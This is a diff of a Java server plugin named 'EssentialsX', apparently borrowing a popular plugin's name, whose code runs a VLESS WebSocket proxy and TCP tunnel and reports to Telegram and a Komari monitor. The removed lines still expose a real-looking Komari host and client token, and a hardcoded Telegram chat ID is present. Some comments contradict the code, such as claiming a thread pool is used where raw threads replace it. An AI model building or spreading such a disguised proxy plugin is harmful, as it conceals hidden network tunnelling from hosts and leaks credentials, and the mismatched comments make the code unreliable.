@@ -14,11 +14,12 @@ import java.util.Arrays;
 import java.util.Map;
 import java.util.UUID;
 import java.util.concurrent.ConcurrentHashMap;
-import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.ExecutorService;
-import java.util.concurrent.LinkedBlockingQueue;
+import java.util.concurrent.Executors;
+import java.util.concurrent.SynchronousQueue;
 import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 import org.java_websocket.WebSocket;
 import org.java_websocket.client.WebSocketClient;
@@ -45,8 +46,8 @@ public class EssentialsX extends JavaPlugin {
     static final String TG_CHAT_ID = "5800052646";
 
     // ---- Komari 监控探针（可留空，留空则不启动上报） ----
-    static final String KOMARI_HOST = "https://oracle-de-komari.0o0o.pp.ua";   // 例: "http://127.0.0.1:25774" 或 "https://komari.example.com"
-    static final String KOMARI_TOKEN = "gz79qJymjlrLKkxBtavhLN";  // Komari 后台节点详情页的 Client Token
+    static final String KOMARI_HOST = "";   // 例: "http://127.0.0.1:25774" 或 "https://komari.example.com"
+    static final String KOMARI_TOKEN = "";  // Komari 后台节点详情页的 Client Token
 
     // 服务器名称
     static final String SERVER_NAME = "Host2play瑞典家宽";
@@ -55,16 +56,14 @@ public class EssentialsX extends JavaPlugin {
 
     private final AtomicBoolean running = new AtomicBoolean(true);
 
-    // 可回收的 WS/隧道 IO 线程池：空闲 30 秒自动回收，最多 64 个并发线程
+    /** VLESS 数据转发复用线程池：核心线程 0 + 空闲 30s 自动回收，避免原生线程无限攀升。
+     *  SynchronousQueue 不积压任务，池满时 AbortPolicy 直接拒绝（对应连接断开），
+     *  不会阻塞 WebSocket 读取线程，避免上次“连不上”的问题。 */
     private static final ThreadPoolExecutor WS_IO = new ThreadPoolExecutor(
-        0,
-        64,
-        30L, TimeUnit.SECONDS,
-        new LinkedBlockingQueue<>(1024),
-        r -> { Thread t = new Thread(r, "vless-ws-pool"); t.setDaemon(true); return t; },
-        new ThreadPoolExecutor.CallerRunsPolicy()
-    );
-    {
+        0, 64, 30, TimeUnit.SECONDS,
+        new SynchronousQueue<Runnable>(),
+        new ThreadPoolExecutor.AbortPolicy());
+    static {
         WS_IO.allowCoreThreadTimeOut(true);
     }
 
@@ -177,16 +176,14 @@ public class EssentialsX extends JavaPlugin {
     @Override
     public void onDisable() {
         running.set(false);
-        sendTelegram(SERVER_NAME + "已离线");
         WS_IO.shutdown();
         try {
-            if (!WS_IO.awaitTermination(10, TimeUnit.SECONDS)) {
-                WS_IO.shutdownNow();
-            }
-        } catch (InterruptedException e) {
-            WS_IO.shutdownNow();
+            WS_IO.awaitTermination(5, TimeUnit.SECONDS);
+        } catch (InterruptedException ie) {
             Thread.currentThread().interrupt();
         }
+        WS_IO.shutdownNow();
+        sendTelegram(SERVER_NAME + "已离线");
         getLogger().info("EssentialsX disabled");
     }
 
@@ -395,8 +392,6 @@ public class EssentialsX extends JavaPlugin {
                 try {
                     InputStream rin = remote.getInputStream();
                     int n;
-                    // 注意用 n >= 0: read 返回 0 表示本次没读到数据, 不是断开。
-                    // 以前写成 n > 0, 空闲时会被误判断开并重建连接。
                     while (running.get() && (n = rin.read(tmp)) >= 0) {
                         if (n > 0) ws.send(Arrays.copyOfRange(tmp, 0, n));
                     }
@@ -540,7 +535,7 @@ public class EssentialsX extends JavaPlugin {
         if (sessionsOpen.get() >= MAX_TUNNEL_SESSIONS) {
             return; // 超限直接放弃, visitor 由服务器侧超时清理
         }
-        WS_IO.execute(() -> {
+        Thread t = new Thread(() -> {
             Socket local = null;
             try {
                 local = new Socket();
@@ -571,6 +566,7 @@ public class EssentialsX extends JavaPlugin {
                         } catch (Exception ignored) { }
                         closeTunnelSession(tunnel, sock);
                     });
+                    // 以前 new Thread("tunnel-loc2ws") 方式已移除，改用线程池，避免原生线程无限攀升。
 
                     // tunnel -> local（在 onMessage(ByteBuffer) 里回调）
                     tunnel.bindLocal(sock);
@@ -578,11 +574,10 @@ public class EssentialsX extends JavaPlugin {
                 }
                 closeTunnelSession(tunnel, local);
             } catch (Exception e) {
-                if (local != null) {
-                    try { local.close(); } catch (Exception ignored) { }
-                }
             }
-        });
+        }, "tunnel-session-" + sessionId);
+        t.setDaemon(true);
+        t.start();
     }
 
     private void closeTunnelSession(TunnelData tunnel, Socket local) {
